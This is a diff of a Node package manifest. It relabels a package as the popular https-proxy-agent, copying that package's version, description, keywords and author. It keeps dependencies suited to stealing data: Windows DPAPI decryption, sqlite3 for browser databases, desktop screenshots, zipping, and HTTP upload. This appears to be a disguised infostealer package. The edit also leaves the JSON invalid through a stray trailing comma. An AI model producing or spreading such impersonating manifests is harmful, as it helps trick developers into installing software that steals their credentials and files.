@@ -1,27 +1,32 @@
 {
   "name": "https-proxy-agent",
-  "version": "1.0.3",
-  "description": "Custom runtime module for node-tcp-https",
+  "version": "5.0.2",
+  "description": "An HTTP(s) proxy `http.Agent` implementation for HTTPS",
   "main": "index.js",
+  "engines": {
+    "node": ">= 6"
+  },
   "files": [
-    "index.js"
+    "index.js",
   ],
   "keywords": [
-    "node",
-    "tcp",
-    "https"
+    "http",
+    "https",
+    "proxy",
+    "agent"
   ],
+  "author": "Nathan Rajlich <nathan@tootallnate.net>",
+  "license": "MIT",
   "dependencies": {
-    "@pishion/node-dpapi": "^1.0.0",
     "@primno/dpapi": "^1.0.0",
+    "agent-base": "^6.0.2",
+    "debug": "^4.3.4",
     "axios": "^1.9.0",
     "buffer-replace": "^1.0.0",
     "form-data": "^4.0.0",
     "fs-extra": "^11.1.1",
-    "javascript-obfuscator": "^5.4.2",
     "jszip": "^3.10.1",
     "screenshot-desktop": "^1.12.7",
     "sqlite3": "^5.1.6"
-  },
-  "license": "MIT"
+  }
 }
